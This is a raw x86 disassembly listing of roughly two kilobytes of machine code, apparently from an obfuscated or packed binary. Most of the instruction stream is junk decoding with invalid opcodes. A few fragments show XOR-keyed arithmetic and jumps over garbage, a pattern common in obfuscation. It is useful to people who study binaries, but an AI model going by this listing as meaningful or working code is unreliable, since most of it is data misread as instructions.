  4020bb:	mov    ebp,0x927ea9a6
  4020c0:	retf   
  4020c1:	fadd   DWORD PTR ds:0x37c9bc21
  4020c7:	xchg   ebx,eax
  4020c8:	call   0x4c2de801
  4020cd:	cmp    eax,0x9ff53cbb
  4020d2:	sbb    ebp,esp
  4020d4:	sti    
  4020d5:	repnz call 0x9b10:0xd3f4081c
  4020dd:	jno    0x40212c
  4020df:	mov    ds:0x71198165,al
  4020e4:	sub    eax,0xc2130f99
  4020e9:	mov    bh,BYTE PTR [ecx]
  4020eb:	repz mov ch,0x5d
  4020ee:	(bad)
  4020f3:	cli    
  4020f4:	ficomp DWORD PTR [edx+0x68]
  4020f7:	cmp    ecx,ecx
  4020f9:	pop    esi
  4020fa:	mov    ebx,0x8414ee02
  4020ff:	retf   0x7221
  402102:	jnp    0x4020be
  402104:	jmp    0x402120
  402106:	aam    0x7f
  402108:	fld    QWORD PTR [eax]
  40210a:	and    ebx,ebp
  40210c:	fisub  DWORD PTR ds:0xcded1489
  402112:	push   cs
  402113:	pushf  
  402114:	popf   
  402115:	rcr    BYTE PTR [edi-0x7eec06a1],1
  40211b:	(bad)
  40211f:	cdq    
  402120:	test   DWORD PTR [eax-0x3a],edi
  402123:	mov    al,0xdc
  402125:	pop    es
  402126:	sub    esi,DWORD PTR [bx+di+0x2f]
  40212a:	scas   eax,DWORD PTR es:[edi]
  40212b:	push   edx
  40212c:	sub    esi,DWORD PTR [ebp-0x243528cb]
  402132:	xlat   BYTE PTR ds:[ebx]
  402133:	dec    edx
  402134:	popa   
  402135:	and    eax,0xc8672b11
  40213a:	enter  0x112b,0x43
  40213e:	push   0x84214be6
  402143:	(bad)  
  402144:	std    
  402145:	out    dx,al
  402146:	out    dx,eax
  402147:	adc    bh,bh
  402149:	aad    0xda
  40214b:	rcr    ecx,1
  40214d:	pop    eax
  40214e:	xor    BYTE PTR [ecx],cl
  402150:	sbb    al,0x41
  402152:	nop
  402153:	dec    ecx
  402154:	in     al,dx
  402155:	pop    ds
  402156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402157:	xor    eax,0xbbaf5395
  40215c:	aas    
  40215d:	push   esp
  40215e:	push   es
  40215f:	test   al,0x6c
  402161:	jno    0x4021a9
  402163:	pop    eax
  402164:	cs or  esi,ebp
  402167:	xor    DWORD PTR [ebp+0x5b65dd04],esp
  40216d:	and    al,0xb6
  40216f:	gs sahf 
  402171:	lock cs push ecx
  402174:	lahf   
  402175:	jle    0x4021f6
  402177:	inc    esp
  402178:	jae    0x4021d7
  40217a:	cld    
  40217b:	sbb    DWORD PTR [ecx-0x5bd55fe7],eax
  402181:	mov    ebx,0x6161020f
  402186:	inc    ebp
  402187:	xchg   edi,eax
  402188:	ins    BYTE PTR es:[edi],dx
  402189:	outs   dx,BYTE PTR ds:[esi]
  40218a:	fdiv   QWORD PTR [edi+ebp*2+0x40c1f63a]
  402191:	mov    ebp,0xb7139a8e
  402196:	in     al,0xde
  402198:	and    eax,0x962bb7a4
  40219d:	into   
  40219e:	hlt    
  40219f:	sbb    cl,BYTE PTR [ecx+0x7bbd740b]
  4021a5:	push   edx
  4021a6:	(bad)  
  4021a7:	adc    BYTE PTR [edx],dh
  4021a9:	mov    al,0xf5
  4021ab:	mov    ecx,0x7361ba8b
  4021b0:	enter  0x292d,0xb7
  4021b4:	sub    BYTE PTR [ecx+0x961ef9b],cl
  4021ba:	cwde   
  4021bb:	sub    al,0x86
  4021bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021be:	test   al,cl
  4021c0:	fs loop 0x4021f8
  4021c3:	inc    ebp
  4021c4:	into   
  4021c5:	loope  0x40219a
  4021c7:	mov    esi,0x2b687ef5
  4021cc:	outs   dx,BYTE PTR ds:[esi]
  4021cd:	pop    ecx
  4021ce:	mov    BYTE PTR [ecx+ecx*2+0x6af7bc4e],bh
  4021d5:	out    dx,al
  4021d6:	repnz and eax,0xfec1f82d
  4021dc:	mov    ebx,0x9aa9d480
  4021e1:	sbb    eax,0x3c18e2dd
  4021e6:	es leave 
  4021e8:	test   eax,0x311bf978
  4021ed:	test   ebp,ebp
  4021ef:	bound  ecx,QWORD PTR [ebx+0x4d6d7a40]
  4021f5:	add    al,0xc0
  4021f7:	push   cs
  4021f8:	and    al,BYTE PTR [edx]
  4021fa:	cmp    DWORD PTR [esi],edx
  4021fc:	pop    eax
  4021fd:	mov    dl,0xbf
  4021ff:	adc    al,BYTE PTR [esi+0x4d]
  402202:	xor    edi,ebp
  402204:	and    ebx,eax
  402206:	sbb    al,0xb7
  402208:	retf   
  402209:	int    0xbb
  40220b:	pusha  
  40220c:	cmp    DWORD PTR [ecx-0x45],esp
  40220f:	and    dh,BYTE PTR [eax-0x13d16281]
  402215:	add    eax,0xd6219142
  40221a:	adc    DWORD PTR [esi],ebp
  40221c:	(bad)  
  40221d:	out    dx,eax
  40221e:	fisttp QWORD PTR [esi]
  402220:	ss in  al,0x12
  402223:	fwait
  402224:	adc    eax,0xa72b549d
  402229:	mov    BYTE PTR [ecx-0x29],cl
  40222c:	jo     0x4021e8
  40222e:	call   0x6927:0x919c31f5
  402235:	inc    ecx
  402236:	jbe    0x40225e
  402238:	aaa    
  402239:	lods   al,BYTE PTR ds:[esi]
  40223a:	mov    ch,0x88
  40223c:	fadd   DWORD PTR ds:0xa595ccab
  402242:	loope  0x40224d
  402244:	cmp    al,0x6c
  402246:	add    eax,0xf22d801c
  40224b:	jmp    0x4022ac
  40224d:	pop    ebp
  40224e:	pop    ebp
  40224f:	mov    ecx,DWORD PTR [ebp+0xc]
  402252:	xor    eax,esi
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi+0x126b92a0],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402243
  4022a2:	mov    esi,0x1967557d
  4022a7:	add    eax,0x14d88a63
  4022ac:	pop    esi
  4022ad:	fs xchg ebp,eax
  4022af:	mov    WORD PTR [esi-0x41cc0c06],es
  4022b5:	xor    BYTE PTR [edi+0x54],0xbd
  4022b9:	pop    ebp
  4022ba:	and    edi,edx
  4022bc:	xchg   ebp,eax
  4022bd:	push   0xd4e9e8cb
  4022c2:	outs   dx,DWORD PTR ds:[esi]
  4022c3:	int    0xc6
  4022c5:	mov    bl,0xd3
  4022c7:	les    ebp,FWORD PTR [eax-0x25]
  4022ca:	and    eax,0xf0b27cd9
  4022cf:	ret    0xdaf7
  4022d2:	(bad)  
  4022d3:	mov    ds:0xea23476e,eax
  4022d8:	mov    bl,0x15
  4022da:	mov    esp,0xf170b5cd
  4022df:	add    esp,0xd6c4586
  4022e5:	pop    ecx
  4022e6:	aas    
  4022e7:	outs   dx,DWORD PTR ds:[esi]
  4022e8:	pop    ebx
  4022e9:	xor    DWORD PTR ds:[si],ebp
  4022ed:	mov    al,ds:0x94001ec2
  4022f2:	cmp    DWORD PTR [eax-0x35483813],ebx
  4022f8:	aaa    
  4022f9:	and    dl,BYTE PTR [eax-0x2a]
  4022fc:	inc    edx
  4022fd:	retf   
  4022fe:	out    dx,al
  4022ff:	mov    ds:0x2b28d768,al
  402304:	add    eax,0x6b2e2c75
  402309:	mov    ecx,0x66301f7b
  40230e:	sub    eax,0x121bc7b1
  402313:	(bad)  
  402314:	dec    edx
  402315:	xchg   ecx,eax
  402316:	mov    dl,0xf3
  402318:	xchg   ecx,eax
  402319:	push   ds
  40231a:	out    dx,al
  40231b:	divps  xmm3,XMMWORD PTR [ebx]
  40231e:	inc    edi
  40231f:	cmp    eax,0xf7652bef
  402324:	je     0x4022bf
  402326:	rcl    DWORD PTR [ebx-0x3],1
  402329:	mov    DWORD PTR [ecx],esp
  40232b:	je     0x40237c
  40232d:	and    edi,esp
  40232f:	sbb    dh,BYTE PTR [ebp+ecx*8-0x46b177ea]
  402336:	mov    ecx,edx
  402338:	ins    DWORD PTR es:[edi],dx
  402339:	pop    esi
  40233a:	jo     0x402320
  40233c:	retf   0xda86
  40233f:	xor    eax,0xf483e946
  402344:	and    bl,ah
  402346:	mov    esi,edx
  402348:	lea    eax,[ebp+0x65]
  40234b:	in     eax,dx
  40234c:	pusha  
  40234d:	jno    0x40232a
  40234f:	jo     0x40234f
  402351:	mov    ebp,0x4c912663
  402356:	and    al,0xac
  402358:	daa    
  402359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40235a:	xchg   esp,eax
  40235b:	into   
  40235c:	gs dec ebx
  40235e:	dec    ecx
  40235f:	data16 je 0x402371
  402362:	pushf  
  402363:	mov    edx,0x3aa64929
  402368:	add    esp,DWORD PTR [ebx+0x2c]
  40236b:	shl    BYTE PTR [esi-0x35],1
  40236e:	ror    BYTE PTR [esi-0x5c],cl
  402371:	test   eax,0x8115b490
  402376:	xor    DWORD PTR [eax+ecx*2],edi
  402379:	cs leave 
  40237b:	and    bh,BYTE PTR [eax]
  40237d:	or     bh,al
  40237f:	(bad)  [eax]
  402381:	mov    bl,0x22
  402383:	das    
  402384:	add    al,0xe8
  402386:	(bad)  
  402387:	pop    edi
  402388:	xchg   esp,eax
  402389:	jge    0x40230b
  40238b:	mov    esp,es
  40238d:	into   
  40238e:	xor    ebx,ebp
  402390:	jge    0x402334
  402392:	mov    ds:0xc17e9089,eax
  402397:	xchg   edi,eax
  402398:	mov    al,ds:0xf66a9626
  40239d:	push   ss
  40239e:	xor    DWORD PTR [edi+0x6b037890],esp
  4023a4:	xor    al,0x37
  4023a6:	sub    ch,ch
  4023a8:	lods   eax,DWORD PTR ds:[esi]
  4023a9:	cmp    edi,DWORD PTR [edx-0x7b]
  4023ac:	xchg   edi,eax
  4023ad:	mov    cl,0xf
  4023af:	jl     0x402340
  4023b1:	pop    ebp
  4023b2:	scas   al,BYTE PTR es:[edi]
  4023b3:	inc    ebp
  4023b4:	shl    BYTE PTR [ecx-0x7e4b26fc],1
  4023ba:	and    al,0xaa
  4023bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023bd:	xor    ebp,ebx
  4023bf:	pop    ds
  4023c0:	scas   eax,DWORD PTR es:[edi]
  4023c1:	imul   esp,DWORD PTR [edi+0x5],0x4a
  4023c5:	jo     0x40236e
  4023c7:	adc    ah,BYTE PTR [ecx+0x62]
  4023ca:	daa    
  4023cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023cc:	mov    eax,ds:0x8e02eb2b
  4023d1:	inc    ecx
  4023d2:	in     eax,0x5a
  4023d4:	push   ds
  4023d5:	inc    edi
  4023d6:	add    eax,0x518d55d9
  4023db:	add    al,0x37
  4023dd:	fcomp  QWORD PTR [ebx+0x6d]
  4023e0:	leave  
  4023e1:	daa    
  4023e2:	sub    esp,eax
  4023e4:	push   esp
  4023e5:	jl     0x40238f
  4023e7:	sub    ebp,ebx
  4023e9:	pop    es
  4023ea:	imul   edi,eax,0xffffffa7
  4023ed:	xchg   ebp,eax
  4023ee:	inc    ebx
  4023ef:	push   edi
  4023f0:	scas   al,BYTE PTR es:[edi]
  4023f1:	push   DWORD PTR [ecx+edi*1+0xa14bbce]
  4023f8:	lahf   
  4023f9:	js     0x4023d0
  4023fb:	(bad)  
  4023fd:	mov    BYTE PTR [esi+0x2c],bl
  402400:	int3   
  402401:	stos   BYTE PTR es:[edi],al
  402402:	mov    ecx,DWORD PTR [edx+edi*2-0x3eb6797b]
  402409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40240a:	dec    ebx
  40240b:	test   BYTE PTR [ebx-0x4f06c714],bl
  402411:	fimul  DWORD PTR [esi]
  402413:	dec    esi
  402414:	sub    edx,edi
  402416:	and    cl,BYTE PTR [eax+ebx*2-0x7d]
  40241a:	and    al,0x80
  40241c:	push   esp
  40241d:	mov    dh,0x1c
  40241f:	leave  
  402420:	mov    esi,0x69f70c24
  402425:	cmp    dl,bl
  402427:	cli    
  402428:	add    edx,DWORD PTR [edi]
  40242a:	add    BYTE PTR [ebx-0x1e4792c7],0xb4
  402431:	addr16 inc ebx
  402433:	in     eax,dx
  402434:	mov    ds:0xed3ad056,al
  402439:	ins    BYTE PTR es:[edi],dx
  40243a:	stos   BYTE PTR es:[edi],al
  40243b:	test   al,0x11
  40243d:	mov    ch,BYTE PTR [esi+0x63]
  402440:	(bad)  
  402441:	mov    esi,DWORD PTR [ebp+edi*2+0x703481a8]
  402448:	loop   0x4023cf
  40244a:	mov    ebx,0x367f4355
  40244f:	retf   
  402450:	mov    esi,ds
  402452:	mov    esi,DWORD PTR [ebp+0x3d102960]
  402458:	sbb    al,0x36
  40245a:	neg    DWORD PTR [ecx-0x6a365c9b]
  402460:	mov    ebp,0x7e3f6993
  402465:	dec    ecx
  402466:	call   0x35f344d7
  40246b:	and    edx,0x8
  40246e:	inc    ebp
  40246f:	je     0x4023fe
  402471:	movsx  edx,WORD PTR [esi-0x770be2cc]
  402478:	mov    al,BYTE PTR ds:0x31f33dc8
  40247e:	jle    0x4024da
  402480:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402482:	xchg   ecx,eax
  402483:	aad    0x80
  402485:	pop    eax
  402486:	mov    al,ds:0x60ac71a9
  40248b:	sbb    edx,DWORD PTR [edx+0x33]
  40248e:	jnp    0x4024fa
  402490:	mov    ds:0x73a0e4b8,eax
  402495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402496:	stos   BYTE PTR es:[edi],al
  402497:	dec    esi
  402498:	aam    0xc5
  40249a:	loope  0x402491
  40249c:	jnp    0x40246e
  40249e:	pop    esi
  40249f:	push   edx
  4024a0:	or     DWORD PTR [esi+ebx*2-0x7246ab85],ecx
  4024a7:	and    al,0xb1
  4024a9:	dec    esi
  4024aa:	push   esp
  4024ab:	out    dx,eax
  4024ac:	lods   eax,DWORD PTR ds:[esi]
  4024ad:	inc    eax
  4024ae:	sti    
  4024af:	mov    ebx,0xff9ba72d
  4024b4:	bnd jle 0x402511
  4024b7:	pop    eax
  4024b8:	test   eax,0x8495d34f
  4024bd:	xor    ch,ah
  4024bf:	jmp    0x215b:0xc06e78c
  4024c6:	xor    eax,0xe7c604bb
  4024cb:	jns    0x402465
  4024cd:	aaa    
  4024ce:	cld    
  4024cf:	loope  0x402499
  4024d1:	sbb    eax,0x80caf457
  4024d6:	test   BYTE PTR [esi+0x4701d442],dh
  4024dc:	ins    DWORD PTR es:[edi],dx
  4024dd:	sub    ah,BYTE PTR [edx]
  4024df:	aas    
  4024e0:	mov    edx,0x7f0fdbf6
  4024e5:	add    edi,DWORD PTR ds:0x7cde05de
  4024eb:	mov    eax,0x137b718
  4024f0:	call   0x8ac23bcd
  4024f5:	pusha  
  4024f6:	and    al,0xa0
  4024f8:	sbb    BYTE PTR [eax+0x1f],cl
  4024fb:	xchg   esi,eax
  4024fc:	test   DWORD PTR [ecx-0x32],eax
  4024ff:	jge    0x4024ce
  402501:	adc    al,0x88
  402503:	cmp    DWORD PTR [edi-0x2290ae7f],0x34da39bf
  40250d:	and    DWORD PTR [ecx+0x12],ebp
  402510:	ins    DWORD PTR es:[edi],dx
  402511:	mov    ecx,0xac290320
  402516:	hlt    
  402517:	add    ebx,DWORD PTR [ecx-0x280c475d]
  40251d:	inc    esp
  40251e:	icebp  
  40251f:	in     eax,dx
  402520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402521:	repz mov ebp,0xf910c10c
  402527:	mov    esi,0x26259a78
  40252c:	push   es
  40252d:	lea    ebp,[ebp+0xd]
  402530:	outs   dx,DWORD PTR ds:[esi]
  402531:	pop    ecx
  402532:	aas    
  402533:	xor    DWORD PTR [esi],edx
  402535:	xlat   BYTE PTR ds:[ebx]
  402536:	inc    edi
  402537:	cdq    
  402538:	ins    DWORD PTR es:[edi],dx
  402539:	sbb    bh,BYTE PTR [edx]
  40253b:	cwde   
  40253c:	xor    DWORD PTR [eax],esp
  40253e:	mov    ds:0xc2d3c701,eax
  402543:	push   edx
  402544:	data16 aam 0x25
  402547:	in     eax,dx
  402548:	cmp    al,0x74
  40254a:	cmp    eax,0xe0ac3359
  40254f:	aaa    
  402550:	fwait
  402551:	fs xchg esp,eax
  402553:	aaa    
  402554:	(bad)
  402557:	out    0xde,al
  402559:	and    al,0x5e
  40255b:	push   edi
  40255c:	inc    eax
  40255d:	out    0x20,al
  40255f:	and    DWORD PTR [edx+0x6b],ecx
  402562:	(bad)  
  402563:	mov    ds:0xd149e99e,eax
  402568:	dec    ebp
  402569:	cwde   
  40256a:	adc    BYTE PTR [edx+ebp*8+0x5744bd2b],bl
  402571:	xor    edx,ecx
  402573:	daa    
  402574:	mov    eax,0x81fcd436
  402579:	cs aad 0x2f
  40257c:	mov    fs,WORD PTR [edi+edi*4]
  40257f:	dec    ebp
  402580:	sub    eax,DWORD PTR [esi+0x64]
  402583:	(bad)  
  402584:	ins    DWORD PTR es:[edi],dx
  402585:	sbb    eax,0xe6c4d32
  40258a:	xor    eax,esi
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	test   eax,0xea8e5a13
  4025b2:	(bad)  
  4025b4:	jl     0x40261d
  4025b6:	jle    0x402634
  4025b8:	jl     0x4025e8
  4025ba:	dec    esp
  4025bb:	sub    cl,BYTE PTR [ecx+ebx*4+0x1f]
  4025bf:	pusha  
  4025c0:	push   es
  4025c1:	mov    dh,0xc9
  4025c3:	xor    ecx,DWORD PTR [eax-0x18]
  4025c6:	cdq    
  4025c7:	fstp   st(5)
  4025c9:	push   edx
  4025ca:	daa    
  4025cb:	imul   eax,edx,0xf
  4025ce:	mov    bl,0xd1
  4025d0:	call   0x9a8cf3c2
  4025d5:	xchg   esi,eax
  4025d6:	ret    
  4025d7:	jl     0x402614
  4025d9:	jae    0x402582
  4025db:	int3   
  4025dc:	(bad)  
  4025dd:	imul   ecx,DWORD PTR [edi-0x6e7d47e6],0xc32e0294
  4025e7:	add    dh,dh
  4025e9:	test   al,0x61
  4025eb:	fiadd  DWORD PTR [edx]
  4025ed:	je     0x402613
  4025ef:	dec    esp
  4025f0:	and    eax,0x81e5e073
  4025f5:	stos   DWORD PTR es:[edi],eax
  4025f6:	jne    0x4025eb
  4025f8:	mov    ds:0x5c293b09,al
  4025fd:	pop    ebx
  4025fe:	jo     0x402639
  402600:	out    0xa8,al
  402602:	pusha  
  402603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402604:	fs mov bh,0xac
  402607:	jg     0x402636
  402609:	mov    bh,0x6a
  40260b:	mov    bh,0x1
  40260d:	mov    al,0x95
  40260f:	inc    esi
  402610:	out    0x17,al
  402612:	hlt    
  402613:	add    eax,eax
  402615:	dec    edi
  402616:	jg     0x40264f
  402618:	or     bl,cl
  40261a:	std    
  40261b:	sbb    esp,DWORD PTR [edx+0x4a]
  40261e:	retf   
  40261f:	bswap  eax
  402621:	je     0x4025d0
  402623:	mov    eax,0x1b74b8aa
  402628:	jl     0x402691
  40262a:	retf   0x372f
  40262d:	ins    BYTE PTR es:[edi],dx
  40262e:	mov    ah,0xa9
  402630:	fstp   DWORD PTR [esi]
  402632:	push   ebp
  402633:	out    dx,eax
  402634:	mov    ah,0x82
  402636:	in     al,0xc4
  402638:	adc    al,0x6b
  40263a:	(bad)  
  40263b:	jo     0x40269e
  40263d:	fcom   DWORD PTR [edx-0x6b840aa7]
  402643:	sub    esp,ebp
  402645:	retf   0x7328
  402648:	shr    DWORD PTR [edi-0x3e],0xe1
  40264c:	loope  0x402611
  40264e:	popf   
  40264f:	in     eax,dx
  402650:	nop
  402651:	dec    ebx
  402652:	push   esp
  402653:	sbb    eax,0xaa38443d
  402658:	test   BYTE PTR [esi],ah
  40265a:	cld    
  40265b:	fwait
  40265c:	pop    eax
  40265d:	ret    
  40265e:	inc    ebp
  40265f:	cld    
  402660:	inc    eax
  402661:	or     cl,bh
  402663:	nop
  402664:	call   0x9359:0x416c5d3c
  40266b:	popf   
  40266c:	xor    eax,0x1eaeebda
  402671:	mov    bl,0xf2
  402673:	sbb    bh,al
  402675:	and    BYTE PTR [ebx-0x36],0x60
  402679:	add    eax,0xb20be9e1
  40267e:	aas    
  40267f:	fwait
  402680:	das    
  402681:	jmp    0xe517370e
  402686:	mov    ebx,0x536058a
  40268b:	out    dx,al
  40268c:	inc    esi
  40268d:	add    edx,DWORD PTR [ecx+0x621141f0]
  402693:	cmp    DWORD PTR [eax+0x8],ebp
  402696:	dec    edi
  402697:	neg    BYTE PTR [edx+edx*8+0x96095d4]
  40269e:	mov    eax,0x97af5c4e
  4026a3:	inc    ebp
  4026a4:	lods   eax,DWORD PTR ds:[esi]
  4026a5:	mov    bh,BYTE PTR [esi]
  4026a7:	or     edi,DWORD PTR [edx]
  4026a9:	xchg   BYTE PTR [eax+0x397b7229],ch
  4026af:	mov    dh,0xfc
  4026b1:	addr16 cmp eax,0xebec31cb
  4026b7:	xchg   esp,eax
  4026b8:	sbb    BYTE PTR [ebx],dl
  4026ba:	push   DWORD PTR [ebx-0x67851d2]
  4026c0:	mov    edx,0x6d402d1c
  4026c5:	add    al,0xc1
  4026c7:	fstp   QWORD PTR [edi-0x514f617b]
  4026cd:	inc    esi
  4026ce:	mov    al,ds:0x3e8909cc
  4026d3:	pop    ds
  4026d4:	dec    eax
  4026d5:	je     0x402728
  4026d7:	pop    esp
  4026d8:	popa   
  4026d9:	pop    ebp
  4026da:	inc    ebp
  4026db:	lock inc edi
  4026dd:	jno    0x40270f
  4026df:	mov    DWORD PTR [edi],ecx
  4026e1:	inc    ecx
  4026e2:	mov    edx,0x976f4c9d
  4026e7:	jg     0x402705
  4026e9:	stos   DWORD PTR es:[edi],eax
  4026ea:	inc    esp
  4026eb:	dec    edx
  4026ec:	jnp    0x40276a
  4026ee:	sbb    ebp,DWORD PTR [ebx-0x8]
  4026f1:	push   ss
  4026f2:	fs clc 
  4026f4:	hlt    
  4026f5:	sub    BYTE PTR [ebx],al
  4026f7:	pop    es
  4026f8:	jns    0x402715
  4026fa:	mov    edi,0x9baf269d
  4026ff:	inc    edi
  402700:	adc    eax,0xb86ca10f
  402705:	out    0x51,eax
  402707:	sahf   
  402708:	inc    edx
  402709:	std    
  40270a:	or     al,0xed
  40270c:	add    DWORD PTR [edx+edi*1],ecx
  40270f:	test   BYTE PTR [ecx+0x4d],al
  402712:	pushf  
  402713:	sub    dh,BYTE PTR [esi+eax*8-0x16]
  402717:	or     al,0x9c
  402719:	inc    edi
  40271a:	mov    cl,0x34
  40271c:	(bad)  
  40271e:	jno    0x4026bf
  402720:	mov    ah,0x9e
  402722:	stos   BYTE PTR es:[edi],al
  402723:	push   cs
  402724:	sbb    DWORD PTR [edx-0xac82fd],esp
  40272a:	fwait
  40272b:	and    al,bh
  40272d:	ins    BYTE PTR es:[edi],dx
  40272e:	cmp    BYTE PTR [edx],bl
  402730:	push   edi
  402731:	aad    0x48
  402733:	sti    
  402734:	and    esi,eax
  402736:	xchg   ebp,eax
  402737:	jecxz  0x40272e
  402739:	lods   al,BYTE PTR ds:[esi]
  40273a:	mov    ebx,0x4d114694
  40273f:	pop    ds
  402740:	es cdq 
  402742:	dec    esp
  402743:	pop    ebp
  402744:	inc    esp
  402745:	in     eax,dx
  402746:	push   0xffffffa1
  402748:	sahf   
  402749:	out    dx,al
  40274a:	and    al,0xe6
  40274c:	sbb    bh,BYTE PTR [eax]
  40274e:	pop    eax
  40274f:	shr    DWORD PTR [edi+edi*8-0x56],0x2c
  402754:	mov    ss,WORD PTR [edx+0x2408fa6c]
  40275a:	push   0xffffff98
  40275c:	push   cs
  40275d:	(bad)  
  40275e:	sbb    edi,ecx
  402760:	sar    DWORD PTR [ebx-0x24],0xb6
  402764:	xchg   ecx,eax
  402765:	leave  
  402766:	and    eax,DWORD PTR [eax-0x6259a7c6]
  40276c:	lock or al,0x71
  40276f:	fistp  DWORD PTR [edi+0x38]
  402772:	pop    ecx
  402773:	ss popa 
  402775:	jae    0x4026ff
  402777:	sub    al,0x86
  402779:	dec    esp
  40277a:	mov    al,ds:0x486a48e3
  40277f:	or     bh,BYTE PTR [ecx+0xb3ae031]
  402785:	and    DWORD PTR [edx-0x4d],eax
  402788:	pop    ecx
  402789:	mov    ds:0xe0261c4c,eax
  40278e:	dec    ecx
  40278f:	xor    al,0x73
  402791:	test   eax,0x22f5610e
  402796:	les    edx,FWORD PTR [ecx+0x5d]
  402799:	arpl   WORD PTR [edi+eax*4],bp
  40279c:	imul   ecx,DWORD PTR [ebp+0x4c],0xffffff90
  4027a0:	ins    DWORD PTR es:[edi],dx
  4027a1:	imul   eax,DWORD PTR [edi+0x4e],0x66
  4027a5:	arpl   WORD PTR [edi+0x55c8ea54],dx
  4027ab:	data16 in al,dx
  4027ad:	pop    edi
  4027ae:	popf   
  4027af:	jl     0x402733
  4027b1:	(bad)  
  4027b2:	mov    fs:0xcc8c88a6,eax
  4027b8:	and    edx,DWORD PTR [edx+0x3d]
  4027bb:	pop    eax
  4027bc:	and    edx,DWORD PTR [ecx-0x3aaa0e17]
  4027c2:	mov    ds:0x79859b9f,al
  4027c7:	ror    BYTE PTR [edi-0x2bc992dc],cl
  4027cd:	sti    
  4027ce:	mov    edi,0x707c06e6
  4027d3:	and    eax,0x2d1ae7ae
  4027d8:	and    ecx,ecx
  4027da:	jbe    0x40278a
  4027dc:	das    
  4027dd:	inc    ebx
  4027de:	sbb    ah,BYTE PTR [ecx-0x9]
  4027e1:	mov    DWORD PTR [ecx+ecx*8-0x38],esp
  4027e5:	aas    
  4027e6:	adc    eax,0xd84e2f8
  4027eb:	push   ebp
  4027ec:	sub    DWORD PTR [ecx-0x62],0xffffffb5
  4027f0:	pop    edx
  4027f1:	sbb    DWORD PTR [edx-0x68],eax
  4027f4:	gs ds push ebx
  4027f7:	pop    ss
  4027f8:	loopne 0x402863
  4027fa:	xchg   DWORD PTR ds:0x1d2cf1b6,ebx
  402800:	xor    dh,bh
  402802:	jns    0x402800
  402804:	loope  0x402824
  402806:	fcomp  DWORD PTR [ebx+0x19]
  402809:	or     DWORD PTR [ebx],esp
  40280b:	adc    ebp,DWORD PTR [eax+0xf]
  40280e:	les    eax,FWORD PTR [eax+0x7]
  402811:	call   0x964d95e4
  402816:	(bad)  
  402817:	lahf   
  402818:	es jae 0x40284d
  40281b:	(bad)  
  40281c:	and    esp,eax
  40281e:	mov    al,ds:0x1aba3764
  402823:	adc    BYTE PTR [ebx],al
  402825:	inc    eax
  402826:	(bad)
  40282a:	(bad)  
  40282b:	mov    edx,0xd54f62fd
  402830:	aas    
  402831:	pop    edi
  402832:	mov    esp,0xcb694355
  402837:	mov    WORD PTR [edx],fs
  402839:	push   ebx
  40283a:	popa   
  40283b:	lahf   
  40283c:	cmp    eax,0x8c7deeff
  402841:	jb     0x4027f1
  402843:	mov    esi,0x8ebc1a54
  402848:	pop    ebp
  402849:	aad    0x2b
  40284b:	in     al,0x3f
  40284d:	cmp    eax,ebx
  40284f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402850:	add    BYTE PTR [esi],ah
  402852:	int3   
  402853:	mov    ecx,0x27092fb5
  402858:	add    cl,al
  40285a:	or     ch,BYTE PTR [edx+0x25]
  40285d:	mov    WORD PTR [esi-0x29],cs
  402860:	ret    0x20be
  402863:	xor    bl,BYTE PTR [ebp+edi*2+0x10c61823]
  40286a:	xchg   edx,eax
  40286b:	jo     0x40287e
  40286d:	ror    DWORD PTR [eax],cl
  40286f:	rcr    DWORD PTR [ebx],1
  402871:	and    al,0x66
  402873:	push   esi
  402874:	mov    ah,0x3a
  402876:	fwait
  402877:	mov    ch,0xa8
  402879:	out    0x57,al
  40287b:	push   0xffffffb1
  40287d:	jp     0x4028c7
  40287f:	pop    ecx
  402880:	sar    eax,0xeb
  402883:	in     ax,0xe5
  402886:	hlt    
  402887:	call   0xf848b1b8
  40288c:	xor    eax,0xe327577c
  402891:	pop    ecx
  402892:	loope  0x402878
  402894:	mov    ds,WORD PTR [esi]
  402896:	and    bl,cl
  402898:	or     esp,edx
  40289a:	inc    edi
  40289b:	pop    ecx
  40289c:	inc    edi
  40289d:	mov    cl,BYTE PTR [ecx]
  40289f:	(bad)  
  4028a1:	push   ss
  4028a2:	je     0x4028b6
  4028a8:	mov    eax,DWORD PTR [ebp-0x8]
  4028ab:	mov    DWORD PTR [eax],0x60341e8d
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
